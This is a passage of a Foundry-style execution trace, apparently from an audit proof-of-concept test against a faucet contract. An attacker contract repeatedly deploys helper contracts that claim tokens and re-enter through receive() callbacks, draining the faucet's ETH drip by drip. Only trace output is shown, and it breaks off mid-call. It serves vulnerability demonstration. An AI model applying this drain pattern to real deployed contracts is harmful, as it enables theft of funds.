    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [8700090] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [8699331] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [8663163] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [8655505] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 710000000000000000 [7.1e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x331811Bc169bf47492cA3404225F2024024D108D
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 58) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [8398121] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [8397362] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [8361194] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [8353536] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 705000000000000000 [7.05e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x24d6FaE9AE8d3dCAdB43d1043C9dC601eAcba44D
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 59) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [8096152] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [8095393] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [8059225] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [8051567] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
